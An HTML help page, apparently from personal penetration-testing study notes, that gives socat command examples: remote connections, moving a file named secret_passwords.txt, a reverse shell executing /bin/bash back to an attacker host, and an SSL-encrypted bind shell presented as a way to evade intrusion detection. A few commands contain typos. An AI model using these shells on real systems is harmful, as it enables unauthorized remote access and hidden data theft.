
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- saved from url=(0014)about:internet -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Socat</title>
<meta name="GENERATOR" content="WinCHM">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style>
html,body { 
	/* Default Font */
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11pt;
}
</style>



<meta http-equiv="X-UA-Compatible" content="IE=8">
<style>
html {
	overflow-y:scroll;
}

body {
	padding: 0px;
	margin: 0px;
	overflow: auto; 
	background-color: #FFFFFF; 
}

#winchm_template_top{
	margin: 0px;
	padding-top: 10px;
	padding-left: 5px;
	padding-bottom: 10px;
	padding-right: 10px;

	font-family: arial, helvetica, sans-serif;
	font-size: 35px;
	font-style: normal;
	font-weight: normal;
	color: #FFFFFF;

	border-bottom-style: solid;
	border-bottom-width: 4px;
	border-bottom-color: #000000;

	width: auto;
	background-color: #FFFFFF;
	text-align: left;
	background-image: url('template/hgrad.png');
	background-repeat: no-repeat;
	
}

#winchm_template_navigation{
	margin-top: 0px;
	margin-left: 0px;
	margin-bottom: 0px;
	margin-right: 0px;

	padding-top: 7px;
	padding-left: 5px;
	padding-bottom: 6px;
	padding-right: 5px;

	font-family: arial, helvetica, sans-serif;
	font-size: 10px;
	font-style: normal;
	font-weight: normal;
	color: #808080; 

	border-top-style: solid;
	border-top-width: 3px;
	border-top-color: #C1C1C1;

	border-bottom-style: solid;
	border-bottom-width: 1px;
	border-bottom-color: #DBDBDB;
	
	background-color: #FFFFFF;
	width: auto;
}

#winchm_template_button{
	float: right;
	top: -3px;
	position: relative;
	text-align: right;
	right: -5px;
	height: auto;
}

#winchm_template_title {
	padding: 0px;
	margin-top: 15px;
	margin-left: 0px;
	margin-bottom: 15px;
	margin-right: 0px;

	font-family: Tahoma, Geneva, sans-serif;
	font-size: 22px;
	font-weight: bold;
	color: #005680;
	text-align: center;
	width: auto;
	background-color: #FFFFFF;

}
#winchm_template_content{
	padding: 0px;
	margin-top: 15px;
	margin-left: 15px;
	margin-bottom: 15px;
	margin-right: 15px;

	width: auto  !important;
	width: 100%;
}

#winchm_template_footer{
	border-width: 1px;
	border-color: #c0c0c0;
	border-top-style: solid;
	
	margin-top: 0px;
	margin-left: 15px;
	margin-bottom: 5px;
	margin-right: 15px;

	padding-top: 6px;
	padding-left: 0px;
	padding-bottom: 20px;
	padding-right: 0px;

	font-family: arial, helvetica, sans-serif;
	font-size: 11px;
	color: #909090;

	text-align: center;	
	width: auto;	
}

#winchm_template_navigation a:link	{text-decoration: none;color: #0000ff}
#winchm_template_navigation a:visited  {text-decoration: none; color: #0000ff}
#winchm_template_navigation a:active {text-decoration: none; color: #0000ff}
#winchm_template_navigation a:hover {text-decoration: none;color: #0000ff}

a:link	{text-decoration: underline; color:#0033cc}
a:visited  {text-decoration: underline; color: #0033cc}
a:active {text-decoration: underline; color: #0033cc }
a:hover {text-decoration: underline;color: #ff0000;}

@media print
{
#winchm_template_button{
visibility:hidden;
}
}
</style>
</head>

<body><script language="JavaScript" type="text/JavaScript">
function syn(){
if(parent.nav.tree){
 if(parent.nav.tree.loaded){
  parent.nav.tree.selectNode(29);
 }else{
  setTimeout("syn()",500);
}
  }else{
  setTimeout("syn()",500);
  }}
if(parent!=self){
  setTimeout("syn()",100);
}else{
  parent.location.href = "../index.htm?page=Socat.htm";
}
originalOnload = window.onload;
if(originalOnload==null){
window.onload = function(){parent.contentLoaded = true;};
}else{
window.onload = function(){originalOnload();parent.contentLoaded = true;};
}
</script> 


<div id="winchm_template_top"><div id="winchm_template_button"><A href="Netcat.htm" title="Previous topic"><img id="winchm_template_prev" alt="Previous topic" src="template/btn_prev_n.gif" border="0"></a><A href="PowerShell.htm" title="Next topic"><img id="winchm_template_next" alt="Next topic" src="template/btn_next_n.gif" border="0"></a></div>
<nobr><IMG align=absMiddle src="template/logo.png" width=40 height=40 style="HEIGHT: 55px; WIDTH: 74px">&nbsp;<FONT size=6><STRONG>COMPUTER</STRONG></FONT></nobr></div>
<div id="winchm_template_navigation">Computer &gt; 
Networking &gt; Tools &gt; </div>
<div id="winchm_template_title">Socat</div>
<div id="winchm_template_content">
<P><FONT size=3>Establishes two bidirectional byte streams 
and transfers data between them.</FONT></P>
<P>
<TABLE style="BORDER-COLLAPSE: collapse" borderColor=#000000 cellSpacing=0 
cellPadding=2 width="100%" border=1>
  
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">socat - TCP4:10.11.0.22:110</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>connect to a remote server (10.11.0.22) on 
      port 110, TCP4 (IPv4), (-) to transfer data between STDIO and the remote 
      host (allowing our keyboard interaction with the shell)&nbsp;</TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">sudo socat TCP4-LISTEN:443 
STDOUT</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>&nbsp;create a listener on port 
  443</TD></TR></TABLE></P>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Transfer 
Files</H3>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">
<TABLE style="BORDER-COLLAPSE: collapse" borderColor=#000000 cellSpacing=0 
cellPadding=2 width="100%" border=1>
  
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">kali@linux:~$ sudo socat 
      TCP4-LISTEN:443, fork file:secret_passwords.txt</FONT>     
      </SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>create a listener on 
      kali, fork creates a child process once connection is made, file to 
      specify the name of the file to be transfered&nbsp;</TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">c:\win&gt; socat 
      TCP4:10.11.0.4:443 
    file:received_secret_passwords.txt,create</FONT>   
      </SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>connect to kali and 
      download the file, create specifies that a new file with the mentioned 
      name will be created&nbsp;</TD></TR></TABLE></P>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Reverse 
Shell</H3>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">
<TABLE style="BORDER-COLLAPSE: collapse" borderColor=#000000 cellSpacing=0 
cellPadding=2 width="100%" border=1>
  
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">c:\atk&gt; socat -d -d TCP4-LISTEN:443 
      STDOUT</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>win attacker runs a listener, -d -d to 
      increase verbosity&nbsp;</TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">kali@trgt:~$ socat TCP4:10.11.0.22:443 
      EXEC:/bin/bash</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>linux target connects to the attacker and 
      after connection win is presented with kali bash 
shell&nbsp;</TD></TR></TABLE></P>
<H3 class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">Encryted 
Bind Shell</H3>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>Secure Socket Layer (SSL) certificate encryption will assist in evading 
intrusion detection systems (IDS) and hide the sensitive data 
transceiving.</FONT></P>
<P class=p 
style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">
<TABLE style="BORDER-COLLAPSE: collapse" borderColor=#000000 cellSpacing=0 
cellPadding=2 width="100%" border=1>
  
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">openssl req -newkey rsa:2048 -nodes -keyout 
      bind_shell.key -x509 -days 362 -out bind_shell.crt</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>
      <DIV class=p 
      style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px">openssl 
      to create a self-signed certificate</DIV>
      <UL class=de_list>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr; COUNTER-RESET: list-counter-216'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>req: initiate a new certificate signing request</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-newkey: generate a new private key</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>rsa:2048: use RSA encryption with a 2,048-bit key 
        length.</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-nodes: store the private key without passphrase 
        protection</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-keyout: save the key to a file</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-x509: output a self-signed certificate instead of a certificate 
        request</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-days: set validity period in days</FONT></DIV>
        <LI class="list-element list-counter-216" 
        style='FONT-SIZE: 11pt; FONT-FAMILY: "Arial"; COLOR: #000000; DIRECTION: ltr'>
        <DIV class=p 
        style="DIRECTION: ltr; TEXT-ALIGN: left; MARGIN-LEFT: 0px; TEXT-INDENT: 0px"><FONT size=3>-out: save the certificate to a file</FONT></DIV></LI></UL></TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">cat 
      bind_shell.key bind_shell.crt &gt; bind_shell.pem</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>combine the key and crt files into a single 
      .pem file&nbsp;</TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New"> kali@trgt:~$ sudo 
      socatOPENSSL-LISTEN:443,cer=bind_shell.pm,verify=0,fork 
      EXEC:/bin/bash</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>verify=0 to disable SSL 
  verification&nbsp;</TD></TR>
  <TR>
    <TD vAlign=middle align=left><SPAN class=code><FONT face="Courier New">c:\atk&gt; socat - 
      OPENSSL:10.11.0.4:443,verify=0</FONT></SPAN>&nbsp;</TD>
    <TD vAlign=middle align=left>&nbsp;</TD></TR></TABLE></P></div>
<div id="winchm_template_footer" align=center>Copyright © 2021 by Mridul Dixit<br> All rights reserved.</div>

</body>
</html>
